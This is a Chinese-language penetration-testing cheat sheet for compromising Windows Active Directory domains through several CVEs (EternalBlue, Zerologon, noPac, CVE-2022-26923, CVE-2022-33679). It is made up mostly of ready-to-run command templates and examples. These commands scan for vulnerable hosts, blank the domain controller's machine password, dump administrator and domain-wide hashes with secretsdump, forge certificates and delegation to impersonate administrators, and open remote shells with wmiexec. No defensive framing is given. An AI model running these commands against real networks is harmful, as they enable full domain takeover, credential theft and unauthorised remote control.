# MS17-010（EternalBlue永恒之蓝）

## 影响范围

### 无官方补丁支持（通杀）

- Windows XP : 所有版本
- Windows Server 2003 : 所有版本

### 有官方补丁支持

- Windows 7: 所有版本
- Windows Server 2008 : 所有版本
- Windows 8.1 : 所有版本
- Windows Server 2012 : 所有版本
- Windows 10 : 所有版本

## 攻击方法

- 批量扫描

```shell
# 模板
fscan -h <网段> -socks5 <socks5代理地址> -m ms17010
# 示例
fscan -h 10.10.10.0/24 -socks5 172.17.0.1:58080 -m ms17010
```

![ms17010](..\images\AD\VLUN\ms17010\pre\1.png)

# CVE-2020-0796（EternalBlack永恒之黑）

## 影响范围

- Windows Server, version 1909 (Server Core installation)
- Windows 10 Version 1909 for ARM64-based Systems
- Windows 10 Version 1909 for x64-based Systems
- Windows 10 Version 1909 for 32-bit Systems
- Windows Server, version 1903 (Server Core installation)
- Windows 10 Version 1903 for ARM64-based Systems
- Windows 10 Version 1903 for x64-based Systems
- Windows 10 Version 1903 for 32-bit Systems

## 攻击方法

- 批量扫描

```shell
# 模板
fscan -h <网段> -socks5 <socks5代理地址> -m cve20200796
# 示例
fscan -h 127.0.0.1 -socks5 172.17.0.1:58080 -m cve20200796
```

![cve20200796](..\images\AD\VLUN\cve20200796\pre\1.png)

# Zerologon（CVE-2020-1472）

## 影响范围

- Windows Server 2008 R2 for x64-based Systems Service Pack 1
- Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
- Windows Server 2012
- Windows Server 2012 (Server Core installation)
- Windows Server 2012 R2
- Windows Server 2012 R2 (Server Core installation)
- Windows Server 2016
- Windows Server 2016 (Server Core installation)
- Windows Server 2019
- Windows Server 2019 (Server Core installation)
- Windows Server, version 1903 (Server Core installation)
- Windows Server, version 1909 (Server Core installation)
- Windows Server, version 2004 (Server Core installation)

## 前期准备

- 批量扫描

```shell
# 模板
proxychains python3 advul/main.py -ts -tf <需要扫描的IP清单> -dc-ip <域控服务器IP> zerologon
# 示例
proxychains python3 advul/main.py -ts -tf ip.list -dc-ip 10.10.10.1 zerologon
```

![zerologon](..\images\AD\VLUN\zerologon\pre\1.png)

## 攻击方法

- 设置域控机器账号密码为空

```shell
# 模板
proxychains python3 zerologon/set_empty_pw.py <域控机器账号> <域控IP>
# 示例
proxychains python3 zerologon/set_empty_pw.py dc 10.10.10.1
```

![zerologon](..\images\AD\VLUN\zerologon\att\1.png)

- 直接登录域控获取域管理员HASH

```shell
# 模板
proxychains secretsdump.py -no-pass <域>/<域控机器账号>@<域控IP> -just-dc-user administrator
# 示例
proxychains secretsdump.py -no-pass hacker.com/dc\$@10.10.10.1 -just-dc-user administrator
```

![zerologon](..\images\AD\VLUN\zerologon\att\2.png)

- 使用域管理员HASH获取域所有HASH，并查找域控机器账号历史HASH

```shell
# 模板
proxychains secretsdump.py <域>/<域管理员账号>@<域控IP> -hashes :<域管理员HASH>
# 示例
proxychains secretsdump.py attack.org/administrator@10.10.10.1 -hashes :7782c491c3a02792f0e86319b29e7a24
```

![zerologon](..\images\AD\VLUN\zerologon\att\3.png)

- 恢复域控机器账号历史HASH

```shell
# 模板
proxychains python3 zerologon/reinstall_original_pw.py <域控机器账号> <域控IP> <域控机器账号历史HASH>
# 示例
proxychains python3 zerologon/reinstall_original_pw.py dc 10.10.10.1 7be31f86a17fae26bd27df78328b0d1e3c81002149ebdaa0cfe5fc48852b4ffbde1dca2e558ed6aa629e21c084e0af5e3f07686d5ede2d704fd697b0799c2449fecad517cd4ac7106056c82998cc416e409a445dcad4e119a74ebde54ae0338ae5f71a83dc4c8c3cf826a4c3f9e1a25f7fd4a6c662ea600d326dbd96bcedf656d332344ab2b18555f1e9df46f020178085c686cfd60babf61d0aac2da4888c82d3edd9924f413651cd8fcb5ec4799181938d59612d974660656bbc0e54ce0e54f6c13c62e33a9df9f9b813b84b8ec95c892c2d9b5ebdaa69e39deaf7d26b2207612ab83bf7e5b223e0fe247d4000e4a3
```

![zerologon](..\images\AD\VLUN\zerologon\att\4.png)

# noPac（CVE-2021-42287、CVE-2021-42278）

## 影响范围

- Windows Server 2012 R2 (Server Core installation)
- Windows Server 2012 R2
- Windows Server 2012 (Server Core installation)
- Windows Server 2012
- Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
- Windows Server 2008 R2 for x64-based Systems Service Pack 1
- Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
- Windows Server 2008 for x64-based Systems Service Pack 2
- Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
- Windows Server 2008 for 32-bit Systems Service Pack 2
- Windows Server 2016 (Server Core installation)
- Windows Server 2016
- Windows Server, version 20H2 (Server Core Installation)
- Windows Server, version 2004 (Server Core installation)
- Windows Server 2022 (Server Core installation)
- Windows Server 2022
- Windows Server 2019 (Server Core installation)
- Windows Server 2019

## 利用条件

- 一个普通域成员帐户
- 该域用户有创建机器用户的权限（一般默认权限）
- DC未打补丁KB5008380或KB5008602

## 前期准备

- 批量扫描

```shell
# 模板
proxychains python3 advul/main.py -ts -tf <IP列表> -u <域账号或机器账号> -p <密码> -dc-ip <域控IP> 42287
# 示例
proxychains python3 advul/main.py -ts -tf ip.list -u worker@hacker.com -p worker@123 -dc-ip 10.10.10.1 42287
```

![nopac](..\images\AD\VLUN\nopac\pre\1.png)

## 攻击方法

- 获取域管理员票据

```shell
# 模板
proxychains python3 noPac.py <域>/<域账号>:<密码> -dc-ip <域控IP> -dc-host <域控名称> --impersonate administrator -dump -just-dc-user
# 示例
proxychains python3 noPac.py hacker.com/worker:worker@123 -dc-ip 10.10.10.1 -dc-host dc --impersonate administrator -dump -just-dc-user
```

![nopac](..\images\AD\VLUN\nopac\att\1.png)

- 远控域控

```shell
# 模板
proxychains wmiexec.py <域>/<域账号>@<域控IP> -no-pass -hashes :<域管理员HASH> -codec 936
# 示例
proxychains wmiexec.py hacker.com/administrator@10.10.10.1 -no-pass -hashes :7782c491c3a02792f0e86319b29e7a24 -codec 936
```

![nopac](..\images\AD\VLUN\nopac\att\2.png)

# CVE-2022-26923

## 利用条件

- 域控安装了ADCS服务的证书
- 目标服务器申请了服务器证书（域控安装了域控证书，即域控支持ldaps）

## 环境搭建

- 在域控组策略: 计算机配置→管理模板→系统→KDC处启用对PKInit Freshness Extension的KDC支持

![cve202226923](..\images\AD\VLUN\cve202226923\cnd\1.png)

## 前期准备

- 创建机器账号

```shell
# 模板
proxychains certipy account create  -u <域账号> -p <密码> -user <要创建的机器账号> -dns <域控域名>
# 示例
proxychains certipy account create -u worker@hacker.com -p worker@123 -user admin -dns dc.hacker.com
```

![cve202226923](..\images\AD\VLUN\cve202226923\pre\1.png)

- 使用创建的机器账号进行批量扫描

```shell
# 模板
proxychains python3 advul/main.py -ts -tf <IP列表> -u <域账号或机器账号> -p <密码> -dc-ip <域控IP> 26923
# 示例
proxychains python3 advul/main.py -ts -all-dc -u admin\$@hacker.com -p VoBqhEUlQCa2Xiu6 -dc-ip 10.10.10.1 26923
```

![cve202226923](..\images\AD\VLUN\cve202226923\pre\2.png)

- 申请域控证书

```shell
# 模板
proxychains certipy req -u <域账号> -p <密码> -ca <证书颁发机构名称> -template Machine -target-ip <ADCS服务器IP> -dc-ip <域控IP>
# 示例
proxychains certipy req -u admin\$@hacker.com -p VoBqhEUlQCa2Xiu6 -ca hacker-CASVR-CA -template Machine -target-ip 10.10.80.1 -dc-ip 10.10.10.1
```

![cve202226923](..\images\AD\VLUN\cve202226923\pre\3.png)

## 攻击方式

### 域控开启 PKINIT 协议支持

- 获取域控票据

```shell
# 模板
proxychains certipy auth -pfx <域控证书> -dc-ip <域控IP>
# 示例
proxychains certipy auth -pfx dc.pfx -dc-ip 10.10.10.1
```

![cve202226923](..\images\AD\VLUN\cve202226923\att\pkinit\1.png)

```shell
# 模板
KRB5CCNAME=dc.ccache proxychains secretsdump.py <域控域名> -no-pass -k -just-dc-user administrator
# 示例
KRB5CCNAME=dc.ccache proxychains secretsdump.py DC.hacker.com -no-pass -k -just-dc-user administrator
```

![cve202226923](..\images\AD\VLUN\cve202226923\att\pkinit\2.png)

### 域控不支持 PKINIT 协议 - KDC_ERR_PADATA_TYPE_NOSUPP 

- 从证书中提取crt和key

```shell
certipy cert -pfx dc.pfx -nokey -out dc.crt
certipy cert -pfx dc.pfx -nocert -out dc.key 
```

![cve202226923](..\images\AD\VLUN\cve202226923\att\rbcd\1.png)

- 配置admin$对域控的基于资源的约束委派

```shell

# 模板
proxychains python3 passthecert.py -action write_rbcd -crt dc.crt -key dc.key -domain <域名> -dc-ip <域控IP> -delegate-from <创建的机器账号> -delegate-to <域控机器账号>
# 示例
proxychains python3 passthecert.py -action write_rbcd -crt dc.crt -key dc.key -domain hacker.com -dc-ip 10.10.10.1 -delegate-from admin\$ -delegate-to dc\$
```

![cve202226923](..\images\AD\VLUN\cve202226923\att\rbcd\2.png)

- 申请域管理员票据

```shell
# 模板
proxychains getST.py -spn cifs/<域控域名> -impersonate administrator <域名>/<机器账号>:<机器账号密码> -dc-ip <域控IP> -force-forwardable
# 示例
proxychains getST.py -spn cifs/dc.hacker.com -impersonate administrator hacker.com/admin\$:VoBqhEUlQCa2Xiu6 -dc-ip 10.10.10.1 -force-forwardable
```

![cve202226923](..\images\AD\VLUN\cve202226923\att\rbcd\3.png)

- 远程登录域控

```shell
# 模板
KRB5CCNAME=administrator.ccache proxychains wmiexec.py <域名>/<域管理员账号>@<域控域名> -k  -no-pass -dc-ip <域控IP> -codec 936
# 示例
KRB5CCNAME=administrator.ccache proxychains wmiexec.py hacker.com/administrator@dc.hacker.com -k -no-pass -dc-ip 10.10.10.1 -codec 936
```

![cve202226923](..\images\AD\VLUN\cve202226923\att\rbcd\4.png)

# CVE-2022-33679

## 影响范围

|       Product       | CPU Architecture | Version | Update | Tested |
| :-----------------: | :--------------: | :-----: | :----: | :----: |
| Windows Server 2008 |     x86/x64      |         |  SP2   |        |
| Windows Server 2008 |     x86/x64      |   R2    |  SP1   |        |
| Windows Server 2012 |     x86/x64      |         |        |        |
| Windows Server 2012 |     x86/x64      |   R2    |        |        |
| Windows Server 2016 |     x86/x64      |         |        |        |
| Windows Server 2019 |     x86/x64      |         |        |        |
| Windows Server 2022 |     x86/x64      |         |        |        |

## 利用条件

- 存在不需要预认证的账号
- 域控开启RC4-MD4弱加密算法

## 前期准备

- 批量扫描

```shell
# 模板
proxychains python3 advul/main.py -ts -tf <IP列表> -u <域账号或机器账号> -p <密码> -dc-ip <域控IP> 33679
# 示例
proxychains python3 advul/main.py -ts -tf ip.list -u worker@hacker.com -p worker@123 -dc-ip 10.10.10.1 33679
```

![cve202233679](..\images\AD\VLUN\cve202233679\pre\1.png)

## 攻击方法（攻击域管理员价值较大）

- 获取ST票据

```shell
# 模板
proxychains python3 CVE-2022-33679.py <域名>/<不需要预认证的账号> <域控机器名> -ts -dc-ip <域控IP> 
# 示例
proxychains python3 CVE-2022-33679.py hacker.com/administrator dc -ts -dc-ip 10.10.10.1
```

![cve202233679](..\images\AD\VLUN\cve202233679\att\1.png)

- 使用ST票据获取域管理员HASH

```shell
# 模板
KRB5CCNAME=<ST票据缓存> proxychains secretsdump.py <域控机器名> -no-pass -k -just-dc-user <要dump的用户>
# 示例
KRB5CCNAME=administrator_dc.ccache proxychains secretsdump.py dc -no-pass -k -just-dc-user administrator
```

![cve202233679](..\images\AD\VLUN\cve202233679\att\2.png)
